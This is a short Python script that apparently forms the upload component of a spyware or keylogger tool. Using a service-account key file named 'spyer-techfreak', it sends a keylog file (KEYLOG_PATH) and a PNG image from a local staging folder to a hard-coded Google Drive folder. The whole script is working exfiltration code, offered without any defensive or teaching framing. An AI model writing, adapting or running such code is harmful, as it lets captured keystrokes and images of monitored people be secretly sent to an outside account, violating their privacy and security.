import googleapiclient.discovery
from googleapiclient.http import MediaFileUpload 
from google.oauth2 import service_account
from httplib2 import Http
import sys

SCOPES = ['https://www.googleapis.com/auth/drive','https://www.googleapis.com/auth/drive.file']
SERVICE_ACCOUNT_FILE = '/opt/sys/src/spyer-techfreak-a4558b616283.json'

credentials = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)

drive_service = googleapiclient.discovery.build('drive', 'v3', credentials=credentials)

#### Upload File
# file_metadata = {'name': 'somefile.txt'}
# media = MediaFileUpload('somefile.txt',mimetype='text/csv')
# file = drive_service.files().create(body=file_metadata,media_body=media,fields='id').execute()
# print('File ID: %s' % file.get('id'))


KEYLOG_PATH = '/opt/sys/toUpload/' + sys.argv[1]

##### Inserting a file in folder
folder_id = '1xGJuzrHZITGOfwhuCT-Okk9UDEUDQhLs'


file_metadata = {
    'name': sys.argv[1],
    'parents': [folder_id]
}
media = MediaFileUpload(KEYLOG_PATH,mimetype='text/csv')
file = drive_service.files().create(body=file_metadata,media_body=media,fields='id').execute()
print('File ID: %s' % file.get('id'))


PHOTO_PATH = '/opt/sys/toUpload/' + sys.argv[2]
file_metadata = {
    'name': sys.argv[2],
    'parents': [folder_id]
}
media = MediaFileUpload(PHOTO_PATH,mimetype='image/png')
file = drive_service.files().create(body=file_metadata,media_body=media,fields='id').execute()
print('File ID: %s' % file.get('id'))

